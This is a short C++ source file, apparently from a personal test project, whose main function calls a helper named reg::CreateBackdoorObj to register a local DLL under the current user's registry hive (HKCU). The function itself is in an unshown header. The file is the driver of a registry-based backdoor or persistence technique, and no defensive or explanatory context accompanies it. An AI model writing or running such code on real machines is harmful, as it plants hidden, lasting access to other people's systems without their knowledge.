#include <stdlib.h>
#include <windows.h>

#include "reg.h";



int main()
{
	std::wstring dllPath = L"c:\\users\\AliSAhmad\\source\\repos\\Test004\\x64\\Debug\\Test004.1.dll";
	reg::CreateBackdoorObj( HKCU, dllPath);

}
